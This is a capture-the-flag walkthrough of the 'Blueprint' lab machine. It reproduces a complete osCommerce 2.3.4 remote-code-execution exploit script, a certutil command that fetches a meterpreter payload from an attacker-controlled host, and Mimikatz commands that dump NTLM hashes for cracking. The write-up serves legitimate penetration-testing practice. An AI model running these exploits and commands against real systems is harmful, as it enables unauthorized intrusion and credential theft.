
# Blueprint

We'll start with our usual nmap scan:

```bash
$ sudo nmap 10.10.207.52 -Pn -p- -A -vv -T4 --script vuln -oN nmap-scan --min-parallelism 55
```

Select running services with

```bash
$ cat nmap-scan | grep -e '[0-9]\+/tcp[[:space:]].*' -o
```

Some results we've got:

[x] 80/tcp    open   http         syn-ack ttl 127 Microsoft IIS httpd 7.5

[x] 135/tcp   open   msrpc        syn-ack ttl 127 Microsoft Windows RPC

[x] 139/tcp   open   netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn

[x] 443/tcp   open   ssl/http     syn-ack ttl 127 Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)

[x] 445/tcp   open   microsoft-ds syn-ack ttl 127 Microsoft Windows 7: 10 microsoft-ds (workgroup: WORKGROUP)

[x] 3306/tcp  open   mysql        syn-ack ttl 127 MariaDB (unauthorized)

[x] 8080/tcp  open   http         syn-ack ttl 127 Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)

[x] 49152/tcp open   msrpc        syn-ack ttl 127 Microsoft Windows RPC

[x] 49153/tcp open   msrpc        syn-ack ttl 127 Microsoft Windows RPC

[x] 49154/tcp open   msrpc        syn-ack ttl 127 Microsoft Windows RPC

[x] 49158/tcp open   msrpc        syn-ack ttl 127 Microsoft Windows RPC

[x] 49159/tcp open   msrpc        syn-ack ttl 127 Microsoft Windows RPC

[x] 49160/tcp open   msrpc        syn-ack ttl 127 Microsoft Windows RPC

By simply visiting https://$IP/ we can tell that it runs oscommerce-2.3.4.
There already is an [exploit](https://www.exploit-db.com/exploits/50128)
for this particular version, although we have to slightly modify it:

```python
# Exploit Title: osCommerce 2.3.4.1 - Remote Code Execution (2)
# Vulnerability: Remote Command Execution when /install directory wasn't removed by the admin
# Exploit: Exploiting the install.php finish process by injecting php payload into the db_database parameter & read the system command output from configure.php
# Notes: The RCE doesn't need to be authenticated
# Date: 26/06/2021
# Exploit Author: Bryan Leong <NobodyAtall>
# Vendor Homepage: https://www.oscommerce.com/
# Version: osCommerce 2.3.4
# Tested on: Windows

import requests
import sys

if(len(sys.argv) != 2):
	print("please specify the osCommerce url")
	print("format: python3 osCommerce2_3_4RCE.py <url>")
	print("eg: python3 osCommerce2_3_4RCE.py http://localhost/oscommerce-2.3.4/catalog")
	sys.exit(0)

baseUrl = sys.argv[1]
testVulnUrl = baseUrl + '/install/install.php'

def rce(command):
	#targeting the finish step which is step 4
	targetUrl = baseUrl + '/install/install.php?step=4'

	payload = "');"
	payload += "passthru('" + command + "');"    # injecting system command here
	payload += "/*"

	#injecting parameter
	data = {
		'DIR_FS_DOCUMENT_ROOT': './',
		'DB_DATABASE' : payload
	}

	response = requests.post(targetUrl, data=data, verify=False)

	if(response.status_code == 200):
		#print('[*] Successfully injected payload to config file')

		readCMDUrl = baseUrl + '/install/includes/configure.php'
		cmd = requests.get(readCMDUrl, verify=False)

		commandRsl = cmd.text.split('\n')

		if(cmd.status_code == 200):
			#print('[*] System Command Execution Completed')
			#removing the error message above
			for i in range(2, len(commandRsl)):
				print(commandRsl[i])
		else:
			return '[!] Configure.php not found'

	else:
		return '[!] Fail to inject payload'

#testing vulnerability accessing the directory
test = requests.get(testVulnUrl, verify=False)

#checking the install directory still exist or able to access or not
if(test.status_code == 200):
	print('[*] Install directory still available, the host likely vulnerable to the exploit.')

	#testing system command injection
	print('[*] Testing injecting system command to test vulnerability')
	cmd = 'whoami'

	print('User: ', end='')
	err = rce(cmd)

	if(err != None):
		print(err)
		sys.exit(0)

	while(True):
		cmd = input('RCE_SHELL$ ')
		err = rce(cmd)

		if(err != None):
			print(err)
			sys.exit(0)

else:
	print('[!] Install directory not found, the host is not vulnerable')
	sys.exit(0)
```

Generate a meterpreter shell and download it with command:

```
$ certutil.exe -urlcache -f http://$ATTACKER_IP:$ATTACKER_PORT/shell.exe shell.exe
```

Execute it:

```
.\shell.exe
```

Cool. Now, grab Mimikatz from [Github Releases](https://github.com/gentilkiwi/mimikatz/releases).
You'll see a warning about malware on the page, because it serves already compiled
mimikatz exemplars. Personally, I downloaded the .7z archive and used compiled
version for Win32.

First, verify that you can dump hashes (Which of course you can, given that you have
nt authority\system privileges):

```
mimikatz # privilege::debug
```

You should see 

> Privilege '20' OK

Next, do

```
mimikatz # token::elevate
mimikatz # lsadump::sam
```

And there you have a Lab's NTLM hash. Save it to a file on your machine and crack it!
Go to [CrackStation](https://crackstation.net/), paste the hash and there you have it -
the first flag!

Root flag can be found at C:\Users\Administrator\Desktop\root.txt.txt
